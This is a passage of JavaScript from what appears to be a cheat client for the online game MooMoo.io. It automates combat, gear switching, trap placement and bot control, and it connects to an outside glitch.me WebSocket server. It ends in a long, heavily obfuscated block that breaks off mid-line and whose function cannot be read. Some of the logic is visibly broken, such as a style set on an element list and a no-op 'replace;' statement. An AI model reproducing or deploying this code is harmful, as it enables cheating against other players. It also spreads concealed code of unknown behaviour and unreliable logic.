                if (player.weapons[1] && !clicks.left && !clicks.right && !traps.inTrap && !instaC.isTrue && !(useWasd && near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8)) {
                    if (player.reloads[player.weapons[0]] == 0 && player.reloads[player.weapons[1]] == 0) {
                        if (!my.reloaded) {
                            my.reloaded = true;
                            let fastSpeed = items.weapons[player.weapons[0]].spdMult < items.weapons[player.weapons[1]].spdMult ? 1 : 0;
                            if (player.weaponIndex != player.weapons[fastSpeed] || player.buildIndex > -1) {
                                selectWeapon(player.weapons[fastSpeed]);
                            }
                        }
                        // if(useWasd) {
                        //     if (!autos.stopspin) {
                        //         setTimeout(()=>{
                        //             autos.stopspin = true;
                        //         }, 375);
                        //     }
                        // }
                    } else {
                        my.reloaded = false;
                        if(useWasd) {
                            autos.stopspin = false;
                        }
                        if (player.reloads[player.weapons[0]] > 0) {
                            if (player.weaponIndex != player.weapons[0] || player.buildIndex > -1) {
                                selectWeapon(player.weapons[0]);
                            }
                        } else if (player.reloads[player.weapons[0]] == 0 && player.reloads[player.weapons[1]] > 0) {
                            if (player.weaponIndex != player.weapons[1] || player.buildIndex > -1) {
                                selectWeapon(player.weapons[1]);
                            }
                            if(useWasd) {
                                if (!autos.stopspin) {
                                    setTimeout(()=>{
                                        autos.stopspin = true;
                                    }, 750);
                                }
                            }
                        }
                    }
                }
                if (!instaC.isTrue && !traps.inTrap && !traps.replaced) {
                    traps.autoPlace();
                }
                if (!macro.q && !macro.f && !macro.v && !macro.h && !macro.n) {
                    packet("D", getAttackDir());
                }
                let hatChanger = function() {
                    if (my.anti0Tick > 0) {
                        buyEquip(6, 0);
                    } else {
                        if (clicks.left || clicks.right) {
                            if ((player.shameCount > 0 && (game.tick - player.bullTick) % config.serverUpdateRate === 0 && player.skinIndex != 45) || my.reSync) {
                                buyEquip(7, 0);
                                buyEquip(13, 1);
                            } else {
                                if (clicks.left) {
                                    buyEquip(player.reloads[player.weapons[0]] == 0 ? getEl("weaponGrind").checked ? 40 : 7 : player.empAnti ? 22 : player.soldierAnti ? 6 : (getEl("antiBullType").value == "abreload" && near.antiBull > 0) ? 11 : near.dist2 <= 300 ? (getEl("antiBullType").value == "abalway" && near.reloads[near.primaryIndex] == 0) ? 11 : 6 : biomeGear(1, 1), 0);
                                } else if (clicks.right) {
                                    buyEquip(player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 ? 40 : player.empAnti ? 22 : player.soldierAnti ? 6 : (getEl("antiBullType").value == "abreload" && near.antiBull > 0) ? 11 : near.dist2 <= 300 ? (getEl("antiBullType").value == "abalway" && near.reloads[near.primaryIndex] == 0) ? 11 : 6 : biomeGear(1, 1), 0);
                                }
                            }
                        } else if (traps.inTrap) {
                            if (traps.info.health <= items.weapons[player.weaponIndex].dmg ? false : (player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0)) {
                                buyEquip(40, 0);
                            } else {
                                if ((player.shameCount > 0 && (game.tick - player.bullTick) % config.serverUpdateRate === 0 && player.skinIndex != 45) || my.reSync) {
                                    buyEquip(7, 0);
                                    buyEquip(13, 1);

                                } else {
                                    buyEquip((player.empAnti || near.dist2 > 300 || !enemy.length) ? 22 : 6, 0);
                                }
                            }
                        } else {
                            if (player.empAnti || player.soldierAnti) {
                                buyEquip(player.empAnti ? 22 : 6, 0);
                                buyEquip(13, 1);
                            } else {
                                if ((player.shameCount > 0 && (game.tick - player.bullTick) % config.serverUpdateRate === 0 && player.skinIndex != 45) || my.reSync) {
                                    buyEquip(7, 0);
                                    buyEquip(13, 1);
                                } else {
                                    if (near.dist2 <= 300) {
                                        buyEquip((getEl("antiBullType").value == "abreload" && near.antiBull > 0) ? 11 : (getEl("antiBullType").value == "abalway" && near.reloads[near.primaryIndex] == 0) ? 11 : 6, 0);
                                    } else {
                                        biomeGear(1);
                                    }
                                }
                            }
                        }
                    }
                }
                let accChanger = function () {
                    if (near.dist2 <= 270) {
                        if (clicks.left) {
                            buyEquip(13, 1);
                        } else if (!clicks.left){
                            buyEquip(13, 1);
                        }
                    }
                    else if (clicks.left) {
                        buyEquip(19,1);
                    }
                    else {
                        buyEquip(11, 1);
                    }
                }
                let wasdGears = function() {
                    if (my.anti0Tick > 0) {
                        buyEquip(12, 0);
                    } else {
                        if (clicks.left || clicks.right) {
                            if (clicks.left) {
                                buyEquip(player.reloads[player.weapons[0]] == 0 ? getEl("weaponGrind").checked ? 40 : 7 : player.empAnti ? 22 : 6, 0);
                            } else if (clicks.right) {
                                buyEquip(player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 ? 40 : player.empAnti ? 22 : 6, 0);
                            }
                        } else if (near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap) {
                            buyEquip(player.reloads[player.weapons[0]] == 0 ? 7 : player.empAnti ? 22 : 6, 0);
                        } else if (traps.inTrap) {
                            if (traps.info.health <= items.weapons[player.weaponIndex].dmg ? false : (player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0)) {
                                buyEquip(40, 0);
                            } else {
                                if ((player.shameCount > 0 && player.skinIndex != 45) || my.reSync) {
                                    buyEquip(7, 0);
                                } else {
                                    buyEquip(player.empAnti ? 22 : 6, 0);
                                }
                            }
                        } else {
                            if (player.empAnti) {
                                buyEquip(22, 0);
                            } else {
                                if ((player.shameCount > 0 && player.skinIndex != 45) || my.reSync) {
                                    buyEquip(7, 0);
                                } else {
                                    buyEquip(6, 0);
                                }
                            }
                        }
                    }
                    if (clicks.left || clicks.right) {
                        if (clicks.left) {
                            buyEquip(0, 1);
                        }
                    } else if (near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap) {
                        buyEquip(0, 1);
                    } else if (traps.inTrap) {
                        buyEquip(0, 1);
                    } else {
                        buyEquip(11, 1);
                    }
                }
                if (storeMenu.style.display != "block" && !instaC.isTrue && !instaC.ticking) {
                    if (useWasd) {
                        wasdGears();
                    } else {
                        hatChanger();
                        accChanger();
                    }
                }
                //lastMoveDir = getSafeDir();
                //packet("f", lastMoveDir, 1);
                if (configs.autoPush && enemy.length && !traps.inTrap && !instaC.ticking) {
                    autoPush();
                } else {
                    if (my.autoPush) {
                        my.autoPush = false;
                        packet("f", lastMoveDir || undefined, 1);
                    }
                }
                if (!my.autoPush && pathFind.active) {
                    Pathfinder();
                }
                if (instaC.ticking) {
                    instaC.ticking = false;
                }
                if (instaC.syncHit) {
                    instaC.syncHit = false;
                }
                if (player.empAnti) {
                    player.empAnti = false;
                }
                if (player.soldierAnti) {
                    player.soldierAnti = false;
                }
                if (my.anti0Tick > 0) {
                    my.anti0Tick--;
                }
                if (traps.replaced) {
                    traps.replaced = false;
                }
                if (traps.antiTrapped) {
                    traps.antiTrapped = false;
                }
                const getPotentialDamage = (build, user) => {
                    const weapIndex = user.weapons[1] === 10 && !player.reloads[user.weapons[1]] ? 1 : 0;
                    const weap = user.weapons[weapIndex];
                    if (player.reloads[weap]) return 0;
                    const weapon = items.weapons[weap];
                    const inDist = cdf(build, user) <= build.getScale() + weapon.range;
                    return (user.visible && inDist) ? weapon.dmg * (weapon.sDmg || 1) * 3.3 : 0;
                };

                const AutoReplace = () => {
                    const replaceable = [];
                    const playerX = player.x;
                    const playerY = player.y;
                    const gameObjectCount = gameObjects.length;

                    for (let i = 0; i < gameObjectCount; i++) {
                        const build = gameObjects[i];
                        if (build.isItem && build.active && build.health > 0) {
                            const item = items.list[build.id];
                            const posDist = 35 + item.scale + (item.placeOffset || 0);
                            const inDistance = cdf(build, player) <= posDist * 2;
                            if (inDistance) {
                                let canDeal = 0;
                                const playersCount = players.length;
                                for (let j = 0; j < playersCount; j++) {
                                    canDeal += getPotentialDamage(build, players[j]);
                                }
                                if (build.health <= canDeal) {
                                    replaceable.push(build);
                                }
                            }
                        }
                    }

                    const findPlacementAngle = (player, itemId, build) => {
                        if (!build) return null;
                        const MAX_ANGLE = 2 * Math.PI;
                        const ANGLE_STEP = Math.PI / 360;
                        const item = items.list[player.items[itemId]];
                        let buildingAngle = Math.atan2(build.y - player.y, build.x - player.x);
                        let tmpS = player.scale + (item.scale || 1) + (item.placeOffset || 0);

                        for (let offset = 0; offset < MAX_ANGLE; offset += ANGLE_STEP) {
                            let angles = [(buildingAngle + offset) % MAX_ANGLE, (buildingAngle - offset + MAX_ANGLE) % MAX_ANGLE];
                            for (let angle of angles) {
                                return angle;
                            }
                        }
                        return null;
                    };

                    const replace = (() => {
                        let nearTrap = liztobj.filter(tmp => tmp.trap && tmp.active && tmp.isTeamObject(player) && cdf(tmp, player) <= tmp.getScale() + 5);
                        let spike = gameObjects.find(tmp => tmp.dmg && tmp.active && tmp.isTeamObject(player) && cdf(tmp, player) < 87 && !nearTrap.length);
                        const buildId = spike ? 4 : 2;

                        replaceable.forEach(build => {
                            let angle = findPlacementAngle(player, buildId, build);
                            if (angle !== null) {
                                place(buildId, angle);
                                textManager.showText(build.x, build.y, 20, 0.15, 1850, '⭐', '#fff', 2);
                            }
                        });
                    });

                    if (near && near.dist3 <= 360) {
                        replace();
                    }
                    replace;
                }
                }
        }
        if (botSkts.length) {
            botSkts.forEach((bots) => {
                if (true) {
                    bots[0].showName = 'YEAHHH';
                }
            });
        }
    }
    for(var i1 = 0; i1 < liztobj.length; i1++) {
        if (liztobj[i1].active && liztobj[i1].health > 0 && UTILS.getDist(liztobj[i1], player, 0, 2) < 150 && getEl("antipush").checked) { // || liztobj[i1].buildHealth <= items.weapons[nearEnemy.weaponIndex].dmg)

            if(liztobj[i1].name.includes("spike") && liztobj[i1]){
                if(liztobj[i1].owner.sid != player.sid && clicks.left == false && tmpObj.reloads[tmpObj.secondaryIndex] == 0){
                    selectWeapon(player.weapons[1])
                    buyEquip(40, 0);
                    packet("D", UTILS.getDirect(liztobj[i1], player, 0, 2))
                    setTickout( () => {
                        buyEquip(6, 0)
                    }, 1);
                }
            }
        }
    }
    function ez(context, x, y) {
        context.fillStyle = "rgba(0, 255, 255, 0.2)";
        context.beginPath();
        context.fill();
        context.closePath();
        context.globalAlpha = 1;
    }
    // UPDATE LEADERBOARD:
    function updateLeaderboard(data) {
        lastLeaderboardData = data;
        return;
        UTILS.removeAllChildren(leaderboardData);
        let tmpC = 1;
        for (let i = 0; i < data.length; i += 3) {
            (function(i) {
                UTILS.generateElement({
                    class: "leaderHolder",
                    parent: leaderboardData,
                    children: [
                        UTILS.generateElement({
                            class: "leaderboardItem",
                            style: "color:" + ((data[i] == playerSID) ? "#fff" : "rgba(255,255,255,0.6)"),
                            text: tmpC + ". " + (data[i + 1] != "" ? data[i + 1] : "unknown")
                        }),
                        UTILS.generateElement({
                            class: "leaderScore",
                            text: UTILS.sFormat(data[i + 2]) || "0"
                        })
                    ]
                });
            })(i);
            tmpC++;
        }
    }

    // LOAD GAME OBJECT:
    function loadGameObject(data) {
        for (let i = 0; i < data.length;) {
            objectManager.add(data[i], data[i + 1], data[i + 2], data[i + 3], data[i + 4],
                              data[i + 5], items.list[data[i + 6]], true, (data[i + 7] >= 0 ? {
                sid: data[i + 7]
            } : null));
            // sid, x, y, dir, s, type, data, setSID, owner
            /*let dist = UTILS.getDist({
                        x: data[i + 1],
                        y: data[i + 2]
                    }, player, 0, 2);
                    let aim = UTILS.getDirect({
                        x: data[i + 1],
                        y: data[i + 2]
                    }, player, 0, 2);
                    find = findObjectBySid(data[i]);
                    if (data[i + 6] == 15) {
                        if (find && !find.isTeamObject(player)) {
                            if (dist <= 100) {
                                traps.dist = dist;
                                traps.aim = aim;
                                traps.protect(aim);
                            }
                        }
                    }*/
            i += 8;
        }
    }

    // ADD AI:
    function loadAI(data) {
        for (let i = 0; i < ais.length; ++i) {
            ais[i].forcePos = !ais[i].visible;
            ais[i].visible = false;
        }
        if (data) {
            let tmpTime = performance.now();
            for (let i = 0; i < data.length;) {
                tmpObj = findAIBySID(data[i]);
                if (tmpObj) {
                    tmpObj.index = data[i + 1];
                    tmpObj.t1 = (tmpObj.t2 === undefined) ? tmpTime : tmpObj.t2;
                    tmpObj.t2 = tmpTime;
                    tmpObj.x1 = tmpObj.x;
                    tmpObj.y1 = tmpObj.y;
                    tmpObj.x2 = data[i + 2];
                    tmpObj.y2 = data[i + 3];
                    tmpObj.d1 = (tmpObj.d2 === undefined) ? data[i + 4] : tmpObj.d2;
                    tmpObj.d2 = data[i + 4];
                    tmpObj.health = data[i + 5];
                    tmpObj.dt = 0;
                    tmpObj.visible = true;
                } else {
                    tmpObj = aiManager.spawn(data[i + 2], data[i + 3], data[i + 4], data[i + 1]);
                    tmpObj.x2 = tmpObj.x;
                    tmpObj.y2 = tmpObj.y;
                    tmpObj.d2 = tmpObj.dir;
                    tmpObj.health = data[i + 5];
                    if (!aiManager.aiTypes[data[i + 1]].name)
                        tmpObj.name = config.cowNames[data[i + 6]];
                    tmpObj.forcePos = true;
                    tmpObj.sid = data[i];
                    tmpObj.visible = true;
                }
                i += 7;
            }
        }
    }

    // ANIMATE AI:
    function animateAI(sid) {
        tmpObj = findAIBySID(sid);
        if (tmpObj) tmpObj.startAnim();
    }

    // GATHER ANIMATION:
    function gatherAnimation(sid, didHit, index) {
        tmpObj = findPlayerBySID(sid);
        if (tmpObj) {
            tmpObj.startAnim(didHit, index);
            tmpObj.gatherIndex = index;
            tmpObj.gathering = 1;

            // if(player.damageThreat >= 100 && cdf(player, tmpObj) <= 300)
            //     healer();

            if (didHit) {
                let tmpObjects = objectManager.hitObj;
                objectManager.hitObj = [];
                game.tickBase(() => {
                    // refind
                    tmpObj = findPlayerBySID(sid);
                    let val = items.weapons[index].dmg * (config.weaponVariants[tmpObj[(index < 9 ? "prima" : "seconda") + "ryVariant"]].val) * (items.weapons[index].sDmg || 1) * (tmpObj.skinIndex == 40 ? 3.3 : 1);
                    tmpObjects.forEach((healthy) => {
                        healthy.health -= val;
                    });
                }, 1);
            }
        }
    }

    // WIGGLE GAME OBJECT:
    function wiggleGameObject(dir, sid) {
        tmpObj = findObjectBySid(sid);
        if (tmpObj) {
            tmpObj.xWiggle += config.gatherWiggle * Math.cos(dir);
            tmpObj.yWiggle += config.gatherWiggle * Math.sin(dir);
            if (tmpObj.health) {
                objectManager.hitObj.push(tmpObj);
            }
        }
    }

    // SHOOT TURRET:
    function shootTurret(sid, dir) {
        tmpObj = findObjectBySid(sid);
        if (tmpObj) {
            if (config.anotherVisual) {
                tmpObj.lastDir = dir;
            } else {
                tmpObj.dir = dir;
            }
            tmpObj.xWiggle += config.gatherWiggle * Math.cos(dir + Math.PI);
            tmpObj.yWiggle += config.gatherWiggle * Math.sin(dir + Math.PI);
        }
    }

    // UPDATE PLAYER VALUE:
    function updatePlayerValue(index, value, updateView) {
        if (player) {
            player[index] = value;
            if (index == "points") {
                if (configs.autoBuy) {
                    autoBuy.hat();
                    autoBuy.acc();
                }
            } else if (index == "kills") {
                if (configs.killChat) {
                    sendChat("Ohayo Darling~ <3");
                    setTimeout(() => {
                        sendChat("i love you <3");
                        setTimeout(() => {
                            sendChat("Hiro...");
                        }, 1000);
                    }, 1000);
                }
            }
        }
    }



    // ACTION BAR:
    function updateItems(data, wpn) {
        if (data) {
            if (wpn) {
                player.weapons = data;
                player.primaryIndex = player.weapons[0];
                player.secondaryIndex = player.weapons[1];
                if (!instaC.isTrue) {
                    selectWeapon(player.weapons[0]);
                }
            } else {
                player.items = data;
            }
        }

        for (let i = 0; i < items.list.length; i++) {
            let tmpI = items.weapons.length + i;
            let actionBarItem = getEl("actionBarItem" + tmpI);
            actionBarItem.style.display = player.items.indexOf(items.list[i].id) >= 0 ? "inline-block" : "none";
            // Add shadow to the element
            // actionBarItem.style.boxShadow = "2px 2px 5px rgba(0, 0, 0, 0.5)";
            document.getElementsByTagName('button').style.boxShadow = "2px 2px 5px rgba(0, 0, 0, 0.5)";

        }

        for (let i = 0; i < items.weapons.length; i++) {
            let actionBarItem = getEl("actionBarItem" + i);
            actionBarItem.style.display = player.weapons[items.weapons[i].type] == items.weapons[i].id ? "inline-block" : "none";
            // Add shadow to the element
            // actionBarItem.style.boxShadow = "2px 2px 5px rgba(0, 0, 0, 0.5)";
            document.getElementsByTagName('button').style.boxShadow = "2px 2px 5px rgba(0, 0, 0, 0.5)";
        }

        let kms = player.weapons[0] == 3 && player.weapons[1] == 15;
        if (kms) {
            getEl("actionBarItem3").style.display = "none";
            getEl("actionBarItem4").style.display = "inline-block";
        }
    }

    // ADD PROJECTILE:
    function addProjectile(x, y, dir, range, speed, indx, layer, sid) {
        projectileManager.addProjectile(x, y, dir, range, speed, indx, null, null, layer, inWindow).sid = sid;
        runAtNextTick.push(Array.prototype.slice.call(arguments));
    }

    // REMOVE PROJECTILE:
    function remProjectile(sid, range) {
        for (let i = 0; i < projectiles.length; ++i) {
            if (projectiles[i].sid == sid) {
                projectiles[i].range = range;
                let tmpObjects = objectManager.hitObj;
                objectManager.hitObj = [];
                game.tickBase(() => {
                    let val = projectiles[i].dmg;
                    tmpObjects.forEach((healthy) => {
                        if (healthy.projDmg) {
                            healthy.health -= val;
                        }
                    });
                }, 1);
            }
        }
    }

    // lol this useless,,, fr
    let noob = false;
    let serverReady = true;
    var isProd = location.hostname !== "127.0.0.1" && !location.hostname.startsWith("192.168.");
    let wssws = isProd ? "wss" : "ws";
    let project = new WebSocket(`${wssws}://beautiful-sapphire-toad.glitch.me`);
    let withSync = false;
    project.binaryType = "arraybuffer";
    project.onmessage = function(msg) {
        let data = msg.data;
        if (data == "isready") {
            serverReady = true;
        }
        if (data == "fine") {
            noob = false;
        }

        if (data == "tezt") {
            addMenuChText(`${player.name}[${player.sid}]`, 'EEEEEEEEEEE', "white");
        }
        if (data == "yeswearesyncer") {
            // let delay = Date.now() - wsDelay;
            withSync = true;
            if (player) {
                textManager.showText(player.x, player.y, 35, 0.1, 500, "Sync: " + window.pingTime + "ms", "#fff");
                console.log("synced!!!!!!!! also delay: " + window.pingTime + "ms");
            }
        }
    };
    project.onopen = function() {
        var gameTitle = getEl("gameName");
        gameTitle.innerText = "Moo Moo";
    };

    // SHOW ALLIANCE MENU:
    function allianceNotification(sid, name) {
        let findBotSID = findSID(bots, sid);
        if (findBotSID) {}
    }

    function setPlayerTeam(team, isOwner) {
        if (player) {
            player.team = team;
            player.isOwner = isOwner;
            if (team == null)
                alliancePlayers = [];
        }
    }

    function setAlliancePlayers(data) {
        alliancePlayers = data;
    }

    // STORE MENU:
    function updateStoreItems(type, id, index) {
        if (index) {
            if (!type)
                player.tails[id] = 1;
            else {
                player.latestTail = id;
            }
        } else {
            if (!type)
                player.skins[id] = 1,
                    id == 7 && (my.reSync = true); // testing perfect bulltick...
            else {
                player.latestSkin = id;
            }
        }
    }


    // SEND MESSAGE:
    function receiveChat(sid, message) {
        if (/img/i.test(message)) return; // Anti img kick
        if (/iframe/i.test(message)) return;
        let kawaii = false;
        let tmpPlayer = findPlayerBySID(sid);
        addMenuChText(`${tmpPlayer.name}[${tmpPlayer.sid}]`, message, "white");
        tmpPlayer.chatMessage = message;
        tmpPlayer.chatCountdown = config.chatCountdown;
        if (message.includes("mod")) {
            setTimeout(() => {
                packet("6", "");
            }, 55);
            setTimeout(() => {
                packet("6", "");
            }, 55);
        }
    }

    // MINIMAP:
    function updateMinimap(data) {
        minimapData = data;
    }

    // SHOW ANIM TEXT:
    function showText(x, y, value, type) {
        // if (config.anotherVisual) {
        textManager.stack.push({
            x: x,
            y: y,
            value: value
        });
        // } else {
        //     textManager.showText(x, y, 50, 0.18, useWasd ? 500 : 1500, Math.abs(value), (value >= 0) ? "#fff" : "#8ecc51");
        // }
    }

    /** APPLY SOCKET CODES */
    function uGAa39(){}var zPV4te=Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'],Imh86ks,QzG8ub,ry8N2BZ,Tl85W6m,rLqAuyh,VqSuJl,fnXXAUr,rMTii5V,GEhvy_Q,UqgF_f,KfMZwa,GSGOh7,cyCERmv,dgXAjo,_SYVIe,ekkU6Y,eQQMUN,hZmlYq;function VUT2s4(uGAa39){return Imh86ks[uGAa39>0x1ac?uGAa39+0x58:uGAa39<0x59?uGAa39-0x4a:uGAa39>0x1ac?uGAa39-0x5:uGAa39-0x5a]}Imh86ks=eQ4mrb();function WfgY8I(uGAa39,zPV4te){return QzG8ub.call(VUT2s4(0xcf),uGAa39,VUT2s4(0x5a),{value:zPV4te,configurable:VUT2s4(0x155)})}uGAa39(QzG8ub=Object.defineProperty,ry8N2BZ=WfgY8I(kb03HM((...zPV4te)=>{var QzG8ub=kb03HM(zPV4te=>{return Imh86ks[zPV4te<0xfb?zPV4te>0xfb?zPV4te+0x18:zPV4te>0xfb?zPV4te-0x21:zPV4te>0xfb?zPV4te+0x61:zPV4te+0x57:zPV4te-0x0]},0x1);uGAa39(zPV4te[QzG8ub(-0x57)]=0x2,zPV4te[VUT2s4(0x5b)]=-0x71);if(zPV4te.EEuhNJ>QzG8ub(-0x40)){var ry8N2BZ=kb03HM(zPV4te=>{return Imh86ks[zPV4te>-0xc?zPV4te>0x147?zPV4te-0x3b:zPV4te>0x147?zPV4te+0x3:zPV4te<-0xc?zPV4te-0x3c:zPV4te+0xb:zPV4te-0x4b]},0x1);return zPV4te[zPV4te[ry8N2BZ(-0xa)]-ry8N2BZ(-0x7)]}else{var Tl85W6m=kb03HM(zPV4te=>{return Imh86ks[zPV4te<-0x28?zPV4te-0x4d:zPV4te>0x12b?zPV4te-0x23:zPV4te<-0x28?zPV4te-0x59:zPV4te+0x27]},0x1);return zPV4te[VUT2s4(0x6c)](zPV4te[zPV4te[Tl85W6m(-0x26)]+VUT2s4(0x64)]())}}),VUT2s4(0x5c))(Ku7gABe,MBRpLjC));var Z4ij83f=[],T48M7Du=[aUFcZqZ(VUT2s4(0x70)),aUFcZqZ(0x1),aUFcZqZ(VUT2s4(0x5c)),aUFcZqZ(VUT2s4(0x66)),aUFcZqZ(VUT2s4(0x67)),aUFcZqZ(0x5),aUFcZqZ(VUT2s4(0x79)),'\x34\x7c\x48\x78\x7a\x7a\x79\x41','\x5b\x72\x3d\x78\x7c\x3f\x3a',aUFcZqZ(VUT2s4(0x7c)),aUFcZqZ(VUT2s4(0x9c)),aUFcZqZ(0x9),aUFcZqZ(0xa),aUFcZqZ(VUT2s4(0xaa)),aUFcZqZ(VUT2s4(0x78)),aUFcZqZ(VUT2s4(0x9a)),aUFcZqZ(VUT2s4(0x81)),'\x2c\x69\x29\x57\x25\x3e\x22\x38\x53\x52\x78\x7a\x62\x51\x4f\x45\x75\x5e\x7e\x55\x60\x50\x6d\x58\x4c\x25\x53\x7a\x5f\x26\x22\x67\x70\x6c\x74\x5f\x3b\x62\x6a\x58\x32\x70\x6d\x59\x4d\x34\x58\x73\x50\x56\x59\x53\x44\x67\x4a\x25\x4b\x57\x28\x59\x7b\x3a\x21\x37\x52\x2c\x3c\x54\x72\x7c\x35\x39\x53\x4d\x56\x7c\x26\x31\x54\x39\x72\x2c\x5d\x65\x23\x30\x6e\x60\x35\x78\x73\x4d\x5a\x32\x71\x60\x56\x78\x39\x65\x46\x7c\x64\x40\x7b\x69\x69\x32\x73\x55\x69\x6b\x56\x55\x3f\x3c\x52\x28\x66\x28\x2c\x7b\x6e\x7c\x73\x36\x43\x6b\x4f\x2c\x4a\x7c\x7e\x48\x52\x60\x71\x4f\x5a\x4c\x34\x6d\x72\x2c\x23\x63\x24\x23\x5e',aUFcZqZ(VUT2s4(0x77)),aUFcZqZ(VUT2s4(0x8e)),aUFcZqZ(VUT2s4(0xa8)),aUFcZqZ(0x12),'\u0050\u007c\u0060\u003c\u0068\u0055\u003e\u0047',aUFcZqZ(VUT2s4(0xcb)),aUFcZqZ(VUT2s4(0x7f)),aUFcZqZ(VUT2s4(0x175)),aUFcZqZ(VUT2s4(0xd0)),aUFcZqZ(0x17),aUFcZqZ(0x18),aUFcZqZ(VUT2s4(0xd3)),aUFcZqZ(VUT2s4(0x90)),'\u007e\u006c\u002b\u0070\u0045\u003a\u0058\u0039\u004e\u0024\u0076\u007c\u0047',aUFcZqZ(VUT2s4(0x5f)),aUFcZqZ(VUT2s4(0x60)),aUFcZqZ(0x1d),aUFcZqZ(VUT2s4(0xd6)),aUFcZqZ(0x1f),aUFcZqZ(0x20),aUFcZqZ(VUT2s4(0x5d)),aUFcZqZ(VUT2s4(0x5d)),aUFcZqZ(VUT2s4(0x8a)),aUFcZqZ(VUT2s4(0xfb)),aUFcZqZ(VUT2s4(0xba)),aUFcZqZ(VUT2s4(0xdb)),aUFcZqZ(VUT2s4(0x5e)),aUFcZqZ(VUT2s4(0x5d)),aUFcZqZ(VUT2s4(0x5d)),aUFcZqZ(VUT2s4(0x5f)),aUFcZqZ(VUT2s4(0x60)),aUFcZqZ(VUT2s4(0xe0)),'\u007e\u006c\u002b\u0070\u0045\u003a\u0058\u0039\u004e\u0024\u0076\u007c\u0047',VUT2s4(0x63),aUFcZqZ(VUT2s4(0xb6)),aUFcZqZ(0x28),aUFcZqZ(VUT2s4(0xbd)),aUFcZqZ(VUT2s4(0xbc)),aUFcZqZ(VUT2s4(0x61)),aUFcZqZ(VUT2s4(0xb3)),aUFcZqZ(VUT2s4(0xb0)),aUFcZqZ(0x2e),aUFcZqZ(0x2f),aUFcZqZ(0x30),aUFcZqZ(VUT2s4(0x96)),aUFcZqZ(VUT2s4(0x62)),aUFcZqZ(VUT2s4(0x61)),aUFcZqZ(0x2d),aUFcZqZ(VUT2s4(0x98)),'\x50\x7c\x60\x3c\x68\x55\x35\x72\x3a\x37\x73\x62\x41\x4b',aUFcZqZ(VUT2s4(0x9e)),aUFcZqZ(VUT2s4(0x140)),'\x2c\x69\x29\x57\x25\x3e\x22\x38\x44\x70\x29\x7a\x57\x4b\x53\x6b\x35\x6e\x29\x4e\x4a\x4e\x7c\x64\x70\x7b\x7d\x56\x3f\x6d\x33\x31\x5b\x5b\x75\x68\x32\x5f\x7e\x58\x72\x5a\x2f\x7c\x4e\x4f\x62\x51\x37\x4f\x3d\x50\x54\x34\x30\x58\x74\x24\x3b\x48\x36\x4f\x62\x51\x60\x49\x6e\x60\x7d\x69\x32\x40\x25\x69\x4c\x4d\x6e\x6d\x33\x31\x60\x63\x4c\x4e\x78\x5b\x7c\x3f\x2a\x4d\x3b',aUFcZqZ(VUT2s4(0x13f)),aUFcZqZ(0x37),aUFcZqZ(VUT2s4(0x111)),aUFcZqZ(0x39),aUFcZqZ(VUT2s4(0x143)),aUFcZqZ(0x3b),aUFcZqZ(VUT2s4(0xad)),aUFcZqZ(VUT2s4(0x74)),aUFcZqZ(0x3e),aUFcZqZ(0x3f),aUFcZqZ(VUT2s4(0x85)),aUFcZqZ(VUT2s4(0x69)),aUFcZqZ(0x42),aUFcZqZ(VUT2s4(0x6b)),aUFcZqZ(VUT2s4(0x6d)),aUFcZqZ(VUT2s4(0x6e)),aUFcZqZ(VUT2s4(0x118)),aUFcZqZ(0x47),aUFcZqZ(VUT2s4(0x62)),aUFcZqZ(VUT2s4(0xf2)),aUFcZqZ(0x49),aUFcZqZ(VUT2s4(0xdf)),aUFcZqZ(VUT2s4(0xae)),aUFcZqZ(VUT2s4(0x151)),aUFcZqZ(VUT2s4(0x154)),aUFcZqZ(VUT2s4(0x8f)),aUFcZqZ(VUT2s4(0x12c)),aUFcZqZ(VUT2s4(0xde)),aUFcZqZ(VUT2s4(0xf6)),aUFcZqZ(VUT2s4(0x82)),aUFcZqZ(VUT2s4(0x156)),aUFcZqZ(0x2a),aUFcZqZ(VUT2s4(0x8c)),aUFcZqZ(VUT2s4(0x84)),aUFcZqZ(VUT2s4(0xaf)),aUFcZqZ(0x56),aUFcZqZ(0x57),'\x50\x7c\x60\x3c\x68\x55\x78\x2f\x2b\x5a\x51\x3c\x4a\x53\x2c\x79\x6a\x45\x66\x23\x53\x67\x5d',aUFcZqZ(VUT2s4(0x99)),'\u0023\u003a\u007c\u007e\u0047\u0067\u006f\u007a\u004c\u0032\u007c\u0030\u007e\u0079\u0055\u003c\u003e\u003d\u007c\u0025\u0045\u0025\u0059\u004b\u0032\u0035\u0037\u002c\u006e\u007d\u006e',aUFcZqZ(VUT2s4(0x14e)),aUFcZqZ(VUT2s4(0x14b)),aUFcZqZ(VUT2s4(0x97)),aUFcZqZ(0x5c),aUFcZqZ(VUT2s4(0x136)),aUFcZqZ(VUT2s4(0xa1)),'\u0039\u006a\u006d\u0039\u007c',aUFcZqZ(0x5f),aUFcZqZ(VUT2s4(0xa3)),aUFcZqZ(VUT2s4(0x108)),aUFcZqZ(VUT2s4(0x147)),aUFcZqZ(VUT2s4(0x148)),VUT2s4(0x63),aUFcZqZ(VUT2s4(0x14a)),aUFcZqZ(0x65),aUFcZqZ(0x66),aUFcZqZ(VUT2s4(0xb5)),aUFcZqZ(VUT2s4(0x157)),aUFcZqZ(VUT2s4(0x10b)),aUFcZqZ(0x6a),aUFcZqZ(0x21),aUFcZqZ(VUT2s4(0x5d)),aUFcZqZ(VUT2s4(0xa7)),aUFcZqZ(0x6c),aUFcZqZ(0x6d),aUFcZqZ(0x6e),aUFcZqZ(0x6f),aUFcZqZ(VUT2s4(0x5d)),aUFcZqZ(VUT2s4(0x15b)),aUFcZqZ(VUT2s4(0x64)),aUFcZqZ(VUT2s4(0x15c)),aUFcZqZ(VUT2s4(0xf0)),aUFcZqZ(0x74),aUFcZqZ(VUT2s4(0x121)),aUFcZqZ(VUT2s4(0x129)),aUFcZqZ(VUT2s4(0x5f)),aUFcZqZ(VUT2s4(0x60)),aUFcZqZ(0x77),aUFcZqZ(VUT2s4(0x68)),aUFcZqZ(0x79),aUFcZqZ(VUT2s4(0x15e